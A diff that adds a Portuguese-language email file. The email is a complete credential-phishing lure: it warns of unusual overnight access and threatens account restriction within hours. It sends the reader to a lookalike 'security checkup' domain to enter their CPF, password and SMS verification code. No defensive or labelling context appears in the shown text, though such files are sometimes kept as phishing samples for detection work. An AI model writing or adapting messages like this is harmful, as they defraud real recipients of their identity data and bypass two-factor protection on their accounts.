@@ -1,0 +1,22 @@
+Assunto: Confirmação de atividade incomum
+
+Olá,
+
+Identificamos um acesso incomum associado ao seu cadastro em nossa plataforma durante a madrugada de hoje.
+
+Como medida preventiva, algumas funcionalidades poderão permanecer limitadas até a confirmação de identidade.
+
+Para evitar interrupções no serviço, acesse:
+
+http://suporte-seguranca-checkup.xyz/client/login
+
+e confirme:
+
+- CPF
+- senha de acesso
+- código enviado por SMS
+
+Caso nenhuma ação seja realizada nas próximas horas, o acesso poderá ser temporariamente restringido.
+
+Atenciosamente,
+Central de Verificação
